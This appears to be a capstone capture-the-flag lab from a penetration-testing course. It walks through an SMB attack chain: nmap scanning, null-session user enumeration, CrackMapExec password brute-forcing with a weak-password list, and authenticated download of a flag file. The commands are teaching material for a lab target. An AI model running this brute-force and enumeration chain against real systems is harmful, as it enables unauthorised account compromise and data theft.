# Exercise 3.5: Full Credential Attack

## Before You Begin

Exercise 3.5 is the capstone lab for Chapters 2 and 3. Everything you have learned; port scanning, share listing, null session enumeration, manual credential testing, scripted loops, and CrackMapExec; comes together in a single end-to-end attack chain. The full chain shows how a real penetration test unfolds: methodical, multi-phase, and building on each discovery.

## Scenario

James Mitchell wants to see the full attack chain demonstrated end-to-end. Starting from nothing but a target IP address, you will move through initial service detection, share enumeration, credential discovery, and authenticated access. The goal is to prove that you can chain every technique from the previous labs into one continuous workflow.

## Your Objectives

- Execute the complete SMB credential attack chain from service discovery through data retrieval
- Combine all techniques from Chapters 2 and 3 into a single workflow
- Discover multiple valid credential pairs
- Capture the flag

---

## Background: The Complete SMB Attack Chain

A professional SMB assessment follows a seven-phase workflow. Each phase feeds into the next; service discovery tells you SMB is running; share enumeration reveals targets; null sessions provide usernames; credentials unlock the data.

```mermaid
graph LR
    A["Phase 1<br/>Service Discovery"] --> B["Phase 2<br/>Share Enumeration"]
    B --> C["Phase 3<br/>Anonymous Access Testing"]
    C --> D["Phase 4<br/>Null Session Enumeration"]
    D --> E["Phase 5<br/>Username Extraction"]
    E --> F["Phase 6<br/>Credential Attack"]
    F --> G["Phase 7<br/>Authenticated Access"]

    style A fill=#2a6496,color:#fff
    style B fill=#2a6496,color:#fff
    style C fill=#2a6496,color:#fff
    style D fill=#2a6496,color:#fff
    style E fill=#2a6496,color:#fff
    style F fill=#d9534f,color:#fff
    style G fill=#6aaa64,color:#fff
```

1. **Service Discovery**: Use Nmap to confirm SMB is running on the target
2. **Share Enumeration**: Use smbclient to list available shares
3. **Anonymous Access Testing**: Attempt to connect without credentials
4. **Null Session Enumeration**: Extract information using rpcclient or enum4linux
5. **Username Extraction**: Parse enumeration output into a clean wordlist
6. **Credential Attack**: Use CrackMapExec to test username/password combinations
7. **Authenticated Access**: Connect with valid credentials and retrieve data

The seven-phase workflow mirrors the methodology described in PTES, OWASP, and NIST penetration testing frameworks. Each phase builds on the output of the one before it.

## Tool Primer: Orchestration Workflow

There are no new tools in this exercise. You are orchestrating everything you have already learned into a single pipeline:

```
nmap → smbclient -L → smbclient -N → rpcclient/enum4linux → grep/cut → crackmapexec → smbclient -U
```

The skill here is not any individual command; it is knowing which tool to use at each phase and how to pass results from one phase to the next.

---

## Walkthrough

### Phase 1: Service Discovery

Start with a version-detection scan on port 445 to confirm SMB is running and identify the protocol version.

!!! kali "Confirm SMB with a version scan"
    The `-sV` flag probes the service banner so you can identify the SMB protocol version. Replace `<target_ip>` with the IP shown in the Active Lab View.

    ```bash
    nmap -sV -p 445 <target_ip>
    ```

    You should see port 445 open with an SMB-related service. Note the version information; this target supports SMBv2/v3 only.

### Phase 2: Share Discovery

List the available shares using a null session.

!!! kali "List shares with a null session"
    The `-L` flag lists shares and `-N` skips the password prompt for the anonymous null session.

    ```bash
    smbclient -L //<target_ip> -N
    ```

    Review the output. You should see a share named **flag** in the listing. The **flag** share is your target. Note any other shares that appear as well.

### Phase 3: Anonymous Access Test

Try to connect to the flag share without credentials.

!!! kali "Test anonymous access to the flag share"
    The `-N` flag attempts the connection with no password to see whether the share permits anonymous access.

    ```bash
    smbclient //<target_ip>/flag -N
    ```

    You should receive an `NT_STATUS_ACCESS_DENIED` error. The share exists, but it requires authentication. Anonymous access is not permitted; you need valid credentials to proceed.

### Phase 4: Null Session Enumeration

Although the share is locked down, null session enumeration may still reveal useful information.

!!! kali "Run a full null session enumeration"
    The `-a` flag runs every enum4linux check (users, groups, shares, and policy) against the target.

    ```bash
    enum4linux -a <target_ip>
    ```

Or perform the same enumeration manually with rpcclient.

!!! kali "Enumerate users manually with rpcclient"
    The null session queries the domain user list directly when you want a faster, targeted result than enum4linux.

    ```bash
    rpcclient -U "" -N <target_ip> -c 'enumdomusers'
    ```

    Look through the output carefully. You should find three usernames: **admin**, **user1**, and **test**. These are the accounts configured on the target.

### Phase 5: Username Extraction

Extract the usernames into a clean wordlist file. The wordlist is the bridge between enumeration and attack.

!!! kali "Extract usernames into users.txt"
    The pipeline runs the enumeration command, filters out everything but the usernames, writes them to a file, and prints the result.

    ```bash
    rpcclient -U "" -N <target_ip> -c 'enumdomusers' | grep -oP 'user:\[\K[^\]]+' > users.txt
    cat users.txt
    ```

    Verify that users.txt contains exactly three entries:

    ```
    admin
    user1
    test
    ```

### Phase 6: Credential Attack

Create a password wordlist containing common weak passwords.

!!! kali "Create the password wordlist"
    The heredoc writes seven common weak passwords to `passwords.txt`, one per line.

    ```bash
    cat > passwords.txt << 'EOF'
    password
    admin
    admin123
    test123
    qwerty
    123456
    letmein
    EOF
    ```

Now run CrackMapExec against the target using both wordlists.

!!! kali "Brute force all users with continue-on-success"
    The `--continue-on-success` flag keeps testing after the first valid pair so every weak account is discovered, not just the first.

    ```bash
    crackmapexec smb <target_ip> -u users.txt -p passwords.txt --continue-on-success
    ```

    Look for lines marked with `[+]` in the output. You should see three successful authentications:

- **admin:admin**
- **user1:password**
- **test:test123**

Three different users, three different weak passwords, all discovered in a single automated pass.

### Phase 7: Authenticated Access

Connect to the flag share using any of the valid credential pairs.

!!! kali "Authenticate to the flag share"
    The `-U admin%admin` syntax supplies a discovered username and password inline.

    ```bash
    smbclient //<target_ip>/flag -U admin%admin
    ```

Once connected, list the contents, download the flag, and disconnect.

!!! kali "Download the flag from the SMB session"
    Run these at the `smb: \>` prompt. The `ls` lists the share, `get` copies `flag.txt` to your Kali directory, and `exit` closes the session.

    ```bash
    smb: \> ls
    smb: \> get flag.txt
    smb: \> exit
    ```

Read the flag file.

!!! kali "Read the downloaded flag"
    The downloaded `flag.txt` now sits in your Kali working directory.

    ```bash
    cat flag.txt
    ```

    The flag is in `OCR{<flag_here>}` format.

---

### Record Your Findings

> **Phase 1; Nmap output:**
>
> ```
> (paste your Nmap output here)
> ```
>
> **Phase 2; Share listing:**
>
> ```
> (paste your smbclient -L output here)
> ```
>
> **Phase 3; Anonymous access test:**
>
> ```
> (paste the access denied output here)
> ```
>
> **Phase 4; Enumeration output:**
>
> ```
> (paste your enum4linux or rpcclient output here)
> ```
>
> **Phase 5; Extracted usernames:**
>
> ```
> (paste the contents of users.txt here)
> ```
>
> **Phase 6; CrackMapExec output:**
>
> ```
> (paste your CrackMapExec output here)
> ```
>
> **Valid credentials discovered:**
>
> | Username | Password |
> |----------|----------|
> |          |          |
> |          |          |
> |          |          |
>
> **Phase 7; Flag:**
>
> ```
> (paste your flag here)
> ```

---

## Analysis Questions

Take a moment to think through these questions. They reinforce the methodology behind the attack chain.

**1. Three users had three different passwords (admin/admin, user1/password, test/test123). None of them are the same. What does this tell you about the organization's password practices?**

??? note "Reveal Answer"

    There is no enforced password policy or standard. Each user chose their own weak password independently. No minimum complexity requirement exists. In a real environment, this suggests decentralized account management where individual users are left to pick their own credentials without any organizational controls.

**2. You discovered all three credential pairs. What would you do next in a real penetration test?**

??? note "Reveal Answer"

    Test each pair against other services running on the network; RDP, WinRM, MSSQL, and any other authenticated service. Credential reuse is extremely common, and Chapter 8 covers this technique in depth. You would also enumerate what each account can access, since different users may have different share permissions and privilege levels. Finally, check for privilege escalation opportunities using the access you have gained.

**3. If you had skipped Phase 4 (enumeration) and only tested "admin," you would have found admin:admin. Why is it important to test all three users?**

??? note "Reveal Answer"

    Different users may have access to different shares and different privilege levels. In a real engagement, a service account (like svc_backup) might have more access than a regular admin account. Full credential discovery provides the most thorough assessment. Stopping at the first valid pair leaves potential access paths undiscovered.

**4. Map each phase of this exercise to the corresponding chapter or lab where you first learned the technique.**

??? note "Reveal Answer"

    Phase 1 (Service Discovery): Exercise 1.3; version detection. Phase 2 (Share Discovery): Exercise 2.2; share listing. Phase 3 (Anonymous Access): Exercise 2.3; anonymous access. Phase 4 (Null Session Enumeration): Exercises 2.7-2.8; user enumeration. Phase 5 (Username Extraction): Exercise 3.4; extraction techniques. Phase 6 (Credential Attack): Exercise 3.3; CrackMapExec. Phase 7 (Authenticated Access): Exercise 3.1; authenticated access. Every skill in this capstone builds on something you have already practiced.

---

## Key Takeaways

- The complete SMB attack chain has seven phases, each building on the previous one
- Multiple valid credentials are common; always use `--continue-on-success` to find them all
- this exercise combined techniques from Exercises 1.3, 2.2, 2.3, 2.7, 3.3, and 3.4 into one workflow
- In real engagements, discovered credentials should be tested against every service on the network (Chapter 8 covers this)
- The methodology (discover, enumerate, attack, access) applies to every protocol, not just SMB
- You have mastered SMB from reconnaissance through exploitation. The next chapter applies similar techniques to a completely different protocol; Remote Desktop Protocol (RDP).
